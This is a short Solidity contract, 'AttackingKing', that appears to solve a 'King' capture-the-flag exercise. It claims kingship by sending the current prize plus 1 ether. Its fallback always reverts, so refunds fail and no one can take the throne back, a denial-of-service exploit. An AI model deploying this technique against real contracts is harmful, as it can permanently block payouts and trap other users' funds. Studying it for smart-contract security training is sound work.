// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address payable public contractAddress;
    uint256 private current_price;


    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        King king  = King(contractAddress);        
        current_price = king._prize();
        (bool sent, bytes memory data) = contractAddress.call{value: current_price + 1 ether}("");
        require(sent, "Failed to send Ether");
    }

    fallback() external {
        revert();
    }
}

